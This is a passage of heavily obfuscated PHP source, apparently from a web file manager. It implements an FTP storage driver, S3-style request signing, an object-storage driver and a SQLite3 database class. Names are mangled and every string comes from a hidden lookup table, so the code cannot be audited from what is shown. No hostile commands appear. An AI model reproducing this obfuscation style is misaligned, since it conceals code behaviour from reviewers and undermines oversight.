$øˆ˜‚§É), array($‡ƒòæ€²[278], $‡ƒòæ€²[279], $‡ƒòæ€²[12]), array($‡ƒòæ€²[278], $‡ƒòæ€²[280], $‡ƒòæ€²[12]), array($‡ƒòæ€²[278], $‡ƒòæ€²[317], $‡ƒòæ€²[12]), array($‡ƒòæ€²[281] => $Á‹ò‰ó¹), array($‡ƒòæ€²[282] => $çîº®Ö¤), array($‡ƒòæ€²[283] => $ªŞ‡˜›ı), array($‡ƒòæ€²[284] => $•àÍù½‹), array($‡ƒòæ€²[285] => $Ä¹±‚Îì))); $«Ÿ’üİÇ = base64_encode(json_encode($¢²Ñ³É)); $¾·ÜüŠï = hash_hmac($‡ƒòæ€²[286], $¬î‡ß­ò, $‡ƒòæ€²[287] . $this->secret, !0); $ŒÃİÌÆ = hash_hmac($‡ƒòæ€²[286], $this->region, $¾·ÜüŠï, !0); $ĞéÅå¶ = hash_hmac($‡ƒòæ€²[286], $äÆóÃáÓ, $ŒÃİÌÆ, !0); $ƒ“¨ğ²º = hash_hmac($‡ƒòæ€²[286], $ŠÓ¬‘·, $ĞéÅå¶, !0); $ÚòÜ¤Šş = hash_hmac($‡ƒòæ€²[286], $«Ÿ’üİÇ, $ƒ“¨ğ²º); $Ï¹ßÃ†° = array($‡ƒòæ€²[257] => $‡ƒòæ€²[12], $‡ƒòæ€²[304] => $‡ƒòæ€²[12], $‡ƒòæ€²[316] => $øˆ˜‚§É, $‡ƒòæ€²[281] => $Á‹ò‰ó¹, $‡ƒòæ€²[288] => $«Ÿ’üİÇ, $‡ƒòæ€²[318] => $çîº®Ö¤, $‡ƒòæ€²[319] => $ªŞ‡˜›ı, $‡ƒòæ€²[320] => $•àÍù½‹, $‡ƒòæ€²[321] => $Ä¹±‚Îì, $‡ƒòæ€²[322] => $ÚòÜ¤Šş, $‡ƒòæ€²[217] => $this->getHost()); return $Ï¹ßÃ†°; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ÀÃÓÚ) { parent::__construct(); if (count($ÀÃÓÚ) > 0) { $this->_init($ÀÃÓÚ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ªú§–œƒ) { $–ˆ†õîò =& $_SERVER[ŒÅŸ‹ä†]; global $config; $this->appCharset = $config[$–ˆ†õîò[1590]]; $this->systemCharset = $config[$–ˆ†õîò[1591]]; if (isset($ªú§–œƒ[$–ˆ†õîò[1592]]) && $ªú§–œƒ[$–ˆ†õîò[1592]]) { $this->systemCharset = $ªú§–œƒ[$–ˆ†õîò[1592]]; } } public function iconvApp($†ÉÂÀ”‰) { return $this->iconvTo($†ÉÂÀ”‰, $this->systemCharset, $this->appCharset); } public function iconvSystem($¿ŒøááÂ) { return $this->iconvTo($¿ŒøááÂ, $this->appCharset, $this->systemCharset); } public function getPathOuter($õ ¢ãÆá) { $Öè”Ø† =& $_SERVER[ŒÅŸ‹ä†]; $¶œ”ˆÖ— = $this->iconvApp($this->pathBase); $õ ¢ãÆá = $this->iconvApp($õ ¢ãÆá); if (substr($¶œ”ˆÖ—, 0, 2) == $Öè”Ø†[1467]) { $¶œ”ˆÖ— = BASIC_PATH . substr($¶œ”ˆÖ—, 2); } if (substr($õ ¢ãÆá, 0, 2) == $Öè”Ø†[1467]) { $õ ¢ãÆá = BASIC_PATH . substr($õ ¢ãÆá, 2); } $¶œ”ˆÖ— = KodIO::clear($¶œ”ˆÖ—); $õ ¢ãÆá = KodIO::clear($õ ¢ãÆá); $õ ¢ãÆá = substr($õ ¢ãÆá, strlen($¶œ”ˆÖ—)); if (empty($this->pathDriver)) { return $õ ¢ãÆá; } return $this->pathDriver . $Öè”Ø†[8] . ltrim($õ ¢ãÆá, $Öè”Ø†[8]); } private function _init($´ˆÃŒˆš = array()) { $Ú¾Ø…ó =& $_SERVER[ŒÅŸ‹ä†]; if (!function_exists($Ú¾Ø…ó[1593])) { throw new Exception(LNG($Ú¾Ø…ó[1594])); } $this->config = $´ˆÃŒˆš; $this->charsetReset($´ˆÃŒˆš); foreach ($´ˆÃŒˆš as $ñÓ§À•® => $âñµ®èÉ) { if (isset($this->{$ñÓ§À•®})) { $this->{$ñÓ§À•®} = $âñµ®èÉ; } } return $this->_login($´ˆÃŒˆš); } private function _login($ÈµÏÉŒ) { $§÷•Ÿ‚© =& $_SERVER[ŒÅŸ‹ä†]; static $±ØæÄšÇ = array(); $…Î€“úİ = md5(json_encode($ÈµÏÉŒ)); if (isset($±ØæÄšÇ[$…Î€“úİ])) { foreach ($±ØæÄšÇ[$…Î€“úİ] as $Ê‰İí¿Ó => $ÀÛªñ¸) { $this->{$Ê‰İí¿Ó} = $ÀÛªñ¸; } return !0; } $—‰©© = parse_url(trim($this->server, $§÷•Ÿ‚©[8])); $this->host = $—‰©©[$§÷•Ÿ‚©[217]]; $½şÚ¥£Â = isset($—‰©©[$§÷•Ÿ‚©[216]]) && $—‰©©[$§÷•Ÿ‚©[216]] == $§÷•Ÿ‚©[1595] ? !0 : !1; $this->scheme = $½şÚ¥£Â ? $§÷•Ÿ‚©[1596] : $§÷•Ÿ‚©[1597]; $this->port = isset($—‰©©[$§÷•Ÿ‚©[218]]) ? $—‰©©[$§÷•Ÿ‚©[218]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($§÷•Ÿ‚©[1598]) . $this->host . $§÷•Ÿ‚©[4] . $this->port, !0); return !1; } $íœ±´Ã´ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$íœ±´Ã´) { $this->writeLog(LNG($§÷•Ÿ‚©[1599]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $§÷•Ÿ‚©[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ÈèùŒË¦ = $this->pasv == $§÷•Ÿ‚©[101] ? !0 : !1; @ftp_pasv($this->connect, $ÈèùŒË¦); $±ØæÄšÇ[$…Î€“úİ] = array($§÷•Ÿ‚©[1600] => $this->connect, $§÷•Ÿ‚©[217] => $this->host, $§÷•Ÿ‚©[216] => $this->scheme, $§÷•Ÿ‚©[218] => $this->port); return $íœ±´Ã´; } private function _isconn($ğª¦…Œ¶ = true) { if (is_resource($this->connect)) { return !0; } if (!$ğª¦…Œ¶) { return !1; } return $this->_login($this->config); } public function mkfile($à«÷³›ó, $É‚½ë½ï = '', $‘€ÙŸè = REPEAT_RENAME) { if ($this->setContent($à«÷³›ó, $É‚½ë½ï)) { return $this->getPathOuter($à«÷³›ó); } $this->writeLog(LNG($_SERVER[ŒÅŸ‹ä†][1601]), !0); return !1; } public function mkdir($¾Â“İÁ‰, $•éƒúõÏ = REPEAT_SKIP) { $¥²İˆã¯ =& $_SERVER[ŒÅŸ‹ä†]; if (!$¾Â“İÁ‰ || $¾Â“İÁ‰ == $¥²İˆã¯[8]) { return !0; } if (!$this->_isconn()) { return !1; } $¾Â“İÁ‰ = $this->iconvSystem($¾Â“İÁ‰); if ($this->_isFolder($¾Â“İÁ‰) || @ftp_mkdir($this->connect, $¾Â“İÁ‰)) { return $this->getPathOuter($¾Â“İÁ‰); } if (!$this->mkdir($this->pathFather($¾Â“İÁ‰))) { return !1; } if ($¾Â“İÁ‰ = @ftp_mkdir($this->connect, $¾Â“İÁ‰)) { return $this->getPathOuter($¾Â“İÁ‰); } $ÓàÊæı˜ = __FUNCTION__ . $¥²İˆã¯[1602]; $this->writeLog($ÓàÊæı˜, !0); return !1; } public function copyFile($´µ¾òù, $Ë“Œ¹ë‹) { if (!$this->_isconn()) { return !1; } $Åº…Ş– = $this->pathThis($this->iconvSystem($´µ¾òù)); $˜áä”¼ = $this->tempFile($Åº…Ş–); $ôüßãÙõ = $this->iconvApp($˜áä”¼); $this->download($´µ¾òù, $ôüßãÙõ); $ç¡Ë¤ = $this->upload($Ë“Œ¹ë‹, $ôüßãÙõ); $this->tempFileRemve($˜áä”¼); return $ç¡Ë¤; } public function moveFile($€‹¬ìúı, $ÖÌá‘–Ä) { if (!$this->_isconn()) { return !1; } $€‹¬ìúı = $this->iconvSystem($€‹¬ìúı); $ÖÌá‘–Ä = $this->iconvSystem($ÖÌá‘–Ä); $Òà™Ë£¸ = @ftp_rename($this->connect, $€‹¬ìúı, $ÖÌá‘–Ä); if (!$Òà™Ë£¸) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } return $this->getPathOuter($ÖÌá‘–Ä); } public function delFile($Ó±¥°É) { if (!$this->_isconn()) { return !1; } $Ó±¥°É = $this->iconvSystem($Ó±¥°É); $ÔšŠ‡ã³ = @ftp_delete($this->connect, $Ó±¥°É); if (!$ÔšŠ‡ã³) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); } return $ÔšŠ‡ã³; } public function delFolder($êÎ²’ºø) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Îé­»Ô‡ = $Ò«•å£ü = array(); $this->fileList($êÎ²’ºø, $Îé­»Ô‡, $Ò«•å£ü, !0); $this->listItemCache = !0; foreach ($Ò«•å£ü as $•ÉÔ²‚Ë) { $‹Ã°…ß = $this->iconvSystem($•ÉÔ²‚Ë[$_SERVER[ŒÅŸ‹ä†][42]]); $Ù©É†Ò× = @ftp_delete($this->connect, $‹Ã°…ß); if (!$Ù©É†Ò×) { return !1; } } foreach ($Îé­»Ô‡ as $‹Ã°…ß) { $‹Ã°…ß = $this->iconvSystem($‹Ã°…ß); $Ù©É†Ò× = @ftp_rmdir($this->connect, $‹Ã°…ß); if (!$Ù©É†Ò×) { return !1; } } $êÎ²’ºø = $this->iconvSystem($êÎ²’ºø); return @ftp_rmdir($this->connect, $êÎ²’ºø); } public function rename($”ş öÉÉ, $¶éí§„) { $é“¯ã¹â =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->_isconn()) { return !1; } $ü†Ÿˆ¼‚ = $this->fileNameAuto($this->pathFather($”ş öÉÉ), $¶éí§„); $ü†Ÿˆ¼‚ = $this->iconvSystem($ü†Ÿˆ¼‚); $”ş öÉÉ = $this->iconvSystem($”ş öÉÉ); $ìßúá¦ş = $this->pathFather($”ş öÉÉ); $†ú‘ÛÉ£ = rtrim($ìßúá¦ş, $é“¯ã¹â[8]) . $é“¯ã¹â[8] . $ü†Ÿˆ¼‚; $ø¹°£¬§ = @ftp_rename($this->connect, $”ş öÉÉ, $†ú‘ÛÉ£); if (!$ø¹°£¬§) { $this->writeLog(__FUNCTION__ . $é“¯ã¹â[1602], !0); return !1; } $†ú‘ÛÉ£ = $this->iconvApp($†ú‘ÛÉ£); return $this->getPathOuter($†ú‘ÛÉ£); } private function folderInfo($®ŒòÉïÑ, $ëÑ¨Ş¶á = false) { $¹¦Á‹Éâ =& $_SERVER[ŒÅŸ‹ä†]; $‰¦÷ù½ï = array($¹¦Á‹Éâ[42] => $this->pathThis($®ŒòÉïÑ), $¹¦Á‹Éâ[97] => $this->getPathOuter($¹¦Á‹Éâ[8] . $®ŒòÉïÑ), $¹¦Á‹Éâ[43] => $¹¦Á‹Éâ[88]); if ($ëÑ¨Ş¶á) { return $‰¦÷ù½ï; } $‰¦÷ù½ï[$¹¦Á‹Éâ[242]] = $‰¦÷ù½ï[$¹¦Á‹Éâ[98]] = 0; $‰¦÷ù½ï[$¹¦Á‹Éâ[243]] = $‰¦÷ù½ï[$¹¦Á‹Éâ[244]] = !0; return $‰¦÷ù½ï; } private function fileInfo($ı¿¦üÔß, $«¢÷óÕ = false, $°µÅ¸ø× = array()) { $”¸¦î’÷ =& $_SERVER[ŒÅŸ‹ä†]; $ÃŒîÉĞ = array($”¸¦î’÷[42] => $this->pathThis($ı¿¦üÔß), $”¸¦î’÷[97] => $this->getPathOuter($”¸¦î’÷[8] . $ı¿¦üÔß), $”¸¦î’÷[43] => $”¸¦î’÷[241], $”¸¦î’÷[89] => isset($°µÅ¸ø×[$”¸¦î’÷[89]]) ? $°µÅ¸ø×[$”¸¦î’÷[89]] : 0, $”¸¦î’÷[177] => $this->ext($ı¿¦üÔß)); if ($«¢÷óÕ) { return $ÃŒîÉĞ; } $ÃŒîÉĞ[$”¸¦î’÷[242]] = $ÃŒîÉĞ[$”¸¦î’÷[98]] = 0; $ÃŒîÉĞ[$”¸¦î’÷[243]] = $ÃŒîÉĞ[$”¸¦î’÷[244]] = !0; $ó¸Û¤×¯ = $this->iconvSystem($ı¿¦üÔß); $ÃŒîÉĞ[$”¸¦î’÷[98]] = @ftp_mdtm($this->connect, $ó¸Û¤×¯); if (empty($°µÅ¸ø×)) { $°µÅ¸ø× = $this->objectMeta($ı¿¦üÔß); if (!$°µÅ¸ø×) { return $ÃŒîÉĞ; } } $ÃŒîÉĞ[$”¸¦î’÷[89]] = $°µÅ¸ø×[$”¸¦î’÷[89]]; return $ÃŒîÉĞ; } public function size($à­á·ì) { $—•£ÖÌÃ = $this->objectMeta($à­á·ì); return $—•£ÖÌÃ ? $—•£ÖÌÃ[$_SERVER[ŒÅŸ‹ä†][89]] : 0; } public function info($Ûµ©ºû) { if ($this->isFile($Ûµ©ºû)) { return $this->fileInfo($Ûµ©ºû, 0); } else { if ($this->isFolder($Ûµ©ºû)) { return $this->folderInfo($Ûµ©ºû); } } return !1; } private function fileList($Æ¼‘åÍ­, &$êÇšÛ¯È, &$ä¹ŒœÔ÷, $¥Ÿëß¾  = false) { $ˆÍõóÛ¦ =& $_SERVER[ŒÅŸ‹ä†]; $Æ¼‘åÍ­ = $this->iconvSystem($Æ¼‘åÍ­); if (!$this->isFolder($Æ¼‘åÍ­)) { return !1; } $Æ¼‘åÍ­ = rtrim($Æ¼‘åÍ­, $ˆÍõóÛ¦[8]) . $ˆÍõóÛ¦[8]; check_abort(); $ñášª½Ø = @ftp_rawlist($this->connect, $Æ¼‘åÍ­); if (!$ñášª½Ø) { $ñášª½Ø = array(); } $Òü«÷³º = array($ˆÍõóÛ¦[10] => 1, $ˆÍõóÛ¦[1412] => 1); foreach ($ñášª½Ø as $ºø²­ö) { $¹©ã“áÉ = $this->_listItem($ºø²­ö); if ($¹©ã“áÉ[0] == $ˆÍõóÛ¦[855]) { continue; } $Ÿ¹º­÷” = $¹©ã“áÉ[8]; if (empty($Ÿ¹º­÷”) && $Ÿ¹º­÷” !== $ˆÍõóÛ¦[239] || isset($Òü«÷³º[$Ÿ¹º­÷”])) { continue; } $Ÿ¹º­÷” = $this->iconvApp($Æ¼‘åÍ­ . ltrim($Ÿ¹º­÷”, $ˆÍõóÛ¦[8])); $ß˜½Ú© = array($ˆÍõóÛ¦[42] => $Ÿ¹º­÷”, $ˆÍõóÛ¦[43] => $ˆÍõóÛ¦[241], $ˆÍõóÛ¦[89] => $¹©ã“áÉ[4]); if (substr($ºø²­ö, 0, 1) == $ˆÍõóÛ¦[1603]) { $ß˜½Ú©[$ˆÍõóÛ¦[43]] = $ˆÍõóÛ¦[88]; $ß˜½Ú©[$ˆÍõóÛ¦[89]] = 0; } $ÍñÚ¿ğ = $ß˜½Ú©[$ˆÍõóÛ¦[43]] == $ˆÍõóÛ¦[88] ? !0 : !1; $this->cacheMethodInfoSet($Ÿ¹º­÷”, $ÍñÚ¿ğ, $ß˜½Ú©); if ($ÍñÚ¿ğ) { $êÇšÛ¯È[] = $Ÿ¹º­÷”; if ($¥Ÿëß¾ ) { $this->fileList($Ÿ¹º­÷”, $êÇšÛ¯È, $ä¹ŒœÔ÷, $¥Ÿëß¾ ); } continue; } $ä¹ŒœÔ÷[] = $ß˜½Ú©; } $this->cacheMethodInfoSet($Æ¼‘åÍ­, !0); } private function _listItem($–±€åˆ) { if (empty($–±€åˆ)) { return array(); } $ß“½£… = preg_split($_SERVER[ŒÅŸ‹ä†][1604], $–±€åˆ); if (count($ß“½£…) <= 9) { return $ß“½£…; } $ß“½£…[8] = trim(substr($–±€åˆ, strpos($–±€åˆ, $ß“½£…[7]) + strlen($ß“½£…[7]))); return array_splice($ß“½£…, 0, 9); } public function listPath($È‹ôîÅ, $Ãï­Ò = false) { $€˜´›Ç =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->_isconn()) { return !1; } $³š¯ˆÏÉ = $¼†ë¶Õå = array(); $this->fileList($È‹ôîÅ, $³š¯ˆÏÉ, $¼†ë¶Õå); foreach ($³š¯ˆÏÉ as $•ã»ÀêŸ => $ò‡øÆ†¡) { $³š¯ˆÏÉ[$•ã»ÀêŸ] = $this->folderInfo($ò‡øÆ†¡, $Ãï­Ò); } foreach ($¼†ë¶Õå as $•ã»ÀêŸ => $ò‡øÆ†¡) { $¼†ë¶Õå[$•ã»ÀêŸ] = $this->fileInfo($ò‡øÆ†¡[$€˜´›Ç[42]], $Ãï­Ò, $ò‡øÆ†¡); } return array($€˜´›Ç[95] => $³š¯ˆÏÉ, $€˜´›Ç[96] => $¼†ë¶Õå); } public function has($ÏÆ®ß§Œ, $”†ìµ¡² = false, $¦ª‹Û² = true) { $¼÷Ÿíİ =& $_SERVER[ŒÅŸ‹ä†]; $®í„”÷ñ = $šú¬Ü…“ = array(); $Ë’Ú“ÊÒ = $”†ìµ¡² ? !0 : !1; $this->fileList($ÏÆ®ß§Œ, $®í„”÷ñ, $šú¬Ü…“, $Ë’Ú“ÊÒ); if ($”†ìµ¡²) { return array($¼÷Ÿíİ[250] => count($šú¬Ü…“), $¼÷Ÿíİ[251] => count($®í„”÷ñ)); } if ($¦ª‹Û²) { if (count($šú¬Ü…“)) { return !0; } } else { if (count($®í„”÷ñ)) { return !0; } } return !1; } public function listAll($´ØĞ»ŸÈ) { $Æ´·À¡¤ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->_isconn()) { return !1; } $œì¡Å … = $¿æêöó = array(); $this->fileList($´ØĞ»ŸÈ, $œì¡Å …, $¿æêöó, !0); $ö„»«ÑÑ = array_to_keyvalue($¿æêöó, $Æ´·À¡¤[42]); foreach ($œì¡Å … as $ òä«ôâ) { if (is_string($ òä«ôâ)) { $ö„»«ÑÑ[$ òä«ôâ] = array($Æ´·À¡¤[89] => 0); } } return $this->listAllFiles($´ØĞ»ŸÈ, $ö„»«ÑÑ); } public function getContent($»ßô«ª¦) { if (!$this->_isconn()) { return !1; } $»ßô«ª¦ = $this->iconvSystem($»ßô«ª¦); return $this->fileSubstr($»ßô«ª¦); } public function setContent($¶æĞ©¿„, $˜¤œËˆĞ = '') { if (!$this->_isconn()) { return !1; } $Éë‰—¢» = $this->pathThis($this->iconvSystem($¶æĞ©¿„)); $ÀàÉ¼Ñ = $this->tempFile($Éë‰—¢»); file_put_contents($ÀàÉ¼Ñ, $˜¤œËˆĞ); $ëèå¦²¯ = $this->upload($¶æĞ©¿„, $this->iconvApp($ÀàÉ¼Ñ)); $this->tempFileRemve($ÀàÉ¼Ñ); return $ëèå¦²¯; } public function fileSubstr($¨ÒÔ³Ó, $ íÆ°êÆ = 0, $ÚéğßÃ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¨ÒÔ³Ó, $ íÆ°êÆ, $ÚéğßÃ); } private function ftpRequest($°›Ì¶â, $ÕŞ¯Ì¸¤ = 0, $¯üÈŞò´ = false) { $»‡ÁƒÅ =& $_SERVER[ŒÅŸ‹ä†]; $°›Ì¶â = $»‡ÁƒÅ[8] . ltrim(str_ltrim($°›Ì¶â, $this->ftpPath), $»‡ÁƒÅ[8]); $°›Ì¶â = $this->iconvSystem($°›Ì¶â); $–ÄÕéæ = $this->scheme . $this->host . $»‡ÁƒÅ[4] . $this->port; $±»‚½ç¢ = curl_init(); curl_setopt($±»‚½ç¢, CURLOPT_URL, $–ÄÕéæ . $this->pathEncode($°›Ì¶â)); curl_setopt($±»‚½ç¢, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¯üÈŞò´) { $Ñ©ïò‚Œ = $ÕŞ¯Ì¸¤ + $¯üÈŞò´ - 1; curl_setopt($±»‚½ç¢, CURLOPT_RANGE, "{$ÕŞ¯Ì¸¤}\x2d{$Ñ©ïò‚Œ}"); } curl_setopt($±»‚½ç¢, CURLOPT_RETURNTRANSFER, 1); $å÷ŞİÉ… = curl_exec($±»‚½ç¢); curl_close($±»‚½ç¢); return $å÷ŞİÉ…; } public function upload($ıâÌŠíŠ, $ŠúŠğóÎ, $üëù±Š = false, $êğŸµ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ıâÌŠíŠ))) { return !1; } $ıâÌŠíŠ = $this->iconvSystem($ıâÌŠíŠ); $ŠúŠğóÎ = $this->iconvSystem($ŠúŠğóÎ); $ñ©Ç¯‡å = ftp_nb_put($this->connect, $ıâÌŠíŠ, $ŠúŠğóÎ, FTP_BINARY); while ($ñ©Ç¯‡å == FTP_MOREDATA) { $ñ©Ç¯‡å = ftp_nb_continue($this->connect); } if ($ñ©Ç¯‡å != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } return $this->getPathOuter($ıâÌŠíŠ); } public function download($•¡¾åäã, $İéíÀŒ® = '') { if (!$this->_isconn()) { return !1; } $•³üŸØ  = $this->pathFather($İéíÀŒ®); if (!IO::mkdir($•³üŸØ )) { return !1; } $•¡¾åäã = $this->iconvSystem($•¡¾åäã); $İéíÀŒ® = $this->iconvSystem($İéíÀŒ®); $µ…ëú‹ª = ftp_nb_get($this->connect, $İéíÀŒ®, $•¡¾åäã, FTP_BINARY); while ($µ…ëú‹ª == FTP_MOREDATA) { $µ…ëú‹ª = ftp_nb_continue($this->connect); } if ($µ…ëú‹ª != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][1602], !0); return !1; } return $this->iconvApp($İéíÀŒ®); } public function exist($õº…çŠ–) { return $this->isFile($õº…çŠ–) || $this->isFolder($õº…çŠ–); } public function isFile($±Îë‘·í) { return !$this->isFolder($±Îë‘·í) && $this->objectMeta($±Îë‘·í); } public function isFolder($ì³É·¦ë) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][188], $ì³É·¦ë); } protected function objectMeta($›™éò¯Ì) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][190], $›™éò¯Ì); } protected function _objectMeta($‘¼ÌßêÅ) { $±óŸúê˜ =& $_SERVER[ŒÅŸ‹ä†]; if ($‘¼ÌßêÅ == $±óŸúê˜[12] || $‘¼ÌßêÅ == $±óŸúê˜[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‘¼ÌßêÅ = $this->iconvSystem($‘¼ÌßêÅ); $‚îˆ® = array($±óŸúê˜[42] => $this->iconvApp($‘¼ÌßêÅ), $±óŸúê˜[43] => $±óŸúê˜[241], $±óŸúê˜[89] => 0); $¶¼¢ï = @ftp_size($this->connect, $‘¼ÌßêÅ); if ($¶¼¢ï != -1) { $‚îˆ®[$±óŸúê˜[89]] = $¶¼¢ï; } else { $—åê¾¹ = @ftp_chdir($this->connect, $‘¼ÌßêÅ); if (!$—åê¾¹) { return !1; } @ftp_chdir($this->connect, $±óŸúê˜[8]); $‚îˆ®[$±óŸúê˜[43]] = $±óŸúê˜[88]; } return $‚îˆ®; } protected function _isFolder($Ô¼´ã¼) { $óï¿ŞªØ =& $_SERVER[ŒÅŸ‹ä†]; if ($Ô¼´ã¼ == $óï¿ŞªØ[12] || $Ô¼´ã¼ == $óï¿ŞªØ[8]) { return !0; } $ÙÂôÖºÃ = $this->_objectMeta($Ô¼´ã¼); return isset($ÙÂôÖºÃ[$óï¿ŞªØ[43]]) && $ÙÂôÖºÃ[$óï¿ŞªØ[43]] == $óï¿ŞªØ[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ º¡ãÒƒ) { parent::__construct($ º¡ãÒƒ); $this->setSignVersion($_SERVER[ŒÅŸ‹ä†][258]); } public function uploadLink($ÅÏœï½§, $éªœ× = 0) { $¢Ææœç« =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isUploadServer()) { return; } $ÜË³ƒ¯ = $this->getType(); if (!in_array($ÜË³ƒ¯, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $­À¶»è‡ = (!$éªœ× ? 1 : ceil($éªœ× / pow(1024, 3))) * 3600 * 4; $ï¯×…ÖŞ = $this->uploadMultiData($ÅÏœï½§, $­À¶»è‡); if ($ï¯×…ÖŞ) { $ï¯×…ÖŞ[$¢Ææœç«[105]] = $ÅÏœï½§; $ï¯×…ÖŞ[$¢Ææœç«[106]] = $ÜË³ƒ¯; } return $ï¯×…ÖŞ; } public function fileOutImage($åê€Ñìˆ, $ŞÇŠØâ = 250) { if ($this->size($åê€Ñìˆ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($åê€Ñìˆ, $ŞÇŠØâ); } $°¯ÇÂÄ÷ = $this->link($åê€Ñìˆ); $°¯ÇÂÄ÷ .= $_SERVER[ŒÅŸ‹ä†][1605] . $ŞÇŠØâ; $this->fileOutLink($°¯ÇÂÄ÷); } } goto DÛÑ—×¾¸“; Aå÷°ĞòË‚: class DbSqlite3Base extends Db { public function __construct($è¢Á¦É­ = '') { $ä²Šşö =& $_SERVER[ŒÅŸ‹ä†]; if (!class_exists($ä²Šşö[64])) { think_exception(think_lang($ä²Šşö[24]) . $ä²Šşö[65]); } if (!empty($è¢Á¦É­)) { if (!isset($è¢Á¦É­[$ä²Šşö[26]])) { $è¢Á¦É­[$ä²Šşö[26]] = 438; } $this->config = $è¢Á¦É­; if (empty($this->config[$ä²Šşö[27]])) { $this->config[$ä²Šşö[27]] = array(); } } } public function connect($¤Óì‡áÀ = '', $´úãğ­³ = 0) { $ØùÂÜ… =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->linkID[$´úãğ­³])) { if (empty($¤Óì‡áÀ)) { $¤Óì‡áÀ = $this->config; } $this->linkID[$´úãğ­³] = new SQLite3($¤Óì‡áÀ[$ØùÂÜ…[31]]); if (!$this->linkID[$´úãğ­³]) { think_exception($this->linkID[$´úãğ­³]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$´úãğ­³]->busyTimeout(30000); if (1 != think_config($ØùÂÜ…[32])) { unset($this->config); } } return $this->linkID[$´úãğ­³]; } public function free() { $this->queryID = null; } public function query($®ó’¨) { $êÀç‰ë =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®ó’¨; if ($this->queryID) { $this->free(); } think_action_status($êÀç‰ë[33], 1); think_status($êÀç‰ë[34]); $this->queryID = $this->_linkID->query($®ó’¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ŞÑµ’àî = $this->getAll(); $this->numRows = count($ŞÑµ’àî); return $ŞÑµ’àî; } } public function execute($„Ê”ãÜ) { $åá®–¯³ =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $„Ê”ãÜ; if ($this->queryID) { $this->free(); } think_action_status($åá®–¯³[35], 1); think_status($åá®–¯³[34]); $¾ùÏû»“ = $this->_linkID->exec($„Ê”ãÜ); $this->debug(); if (!1 === $¾ùÏû»“) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ŒÅŸ‹ä†][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ø©üí¿í = $this->_linkID->query($_SERVER[ŒÅŸ‹ä†][37]); if (!$ø©üí¿í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $·‰Ë÷à£ = $this->_linkID->query($_SERVER[ŒÅŸ‹ä†][38]); if (!$·‰Ë÷à£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $×ÒäÔ‚ğ = array(); while ($ˆ×†Ğ§ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $×ÒäÔ‚ğ[] = $ˆ×†Ğ§; } $this->queryID->reset(); return $×ÒäÔ‚ğ; } public function getFields($²¥‰æé) { $ıÈÂÈÕç =& $_SERVER[ŒÅŸ‹ä†]; $¾—ÂıæÕ = $this->query($ıÈÂÈÕç[39] . $²¥‰æé . $ıÈÂÈÕç[40]); $Ğàì§êÄ = array(); if ($¾—ÂıæÕ) { foreach ($¾—ÂıæÕ as $Æêıº¸¬ => $•†ÆÚÏÔ) { $Ğàì§êÄ[$•†ÆÚÏÔ[$ıÈÂÈÕç[42]]] = array($ıÈÂÈÕç[42] => $•†ÆÚÏÔ[$ıÈÂÈÕç[42]], $ıÈÂÈÕç[43] => $•†ÆÚÏÔ[$ıÈÂÈÕç[43]], $ıÈÂÈÕç[45] => (bool) ($•†ÆÚÏÔ[$ıÈÂÈÕç[45]] === $ıÈÂÈÕç[12]), $ıÈÂÈÕç[47] => $•†ÆÚÏÔ[$ıÈÂÈÕç[66]], $ıÈÂÈÕç[49] => (bool) $•†ÆÚÏÔ[$ıÈÂÈÕç[67]], $ıÈÂÈÕç[52] => (bool) $•†ÆÚÏÔ[$ıÈÂÈÕç[67]]); } } return $Ğàì§êÄ; } public function getTables($÷ùÎğ½ = '') { $ú«ú’²ğ =& $_SERVER[ŒÅŸ‹ä†]; $Ã¦§ñ§† = $this->query($ú«ú’²ğ[55] . $ú«ú’²ğ[56] . $ú«ú’²ğ[57]); $ÕÊÕÓğ = array(); foreach ($Ã¦§ñ§† as $¯À –òÛ => 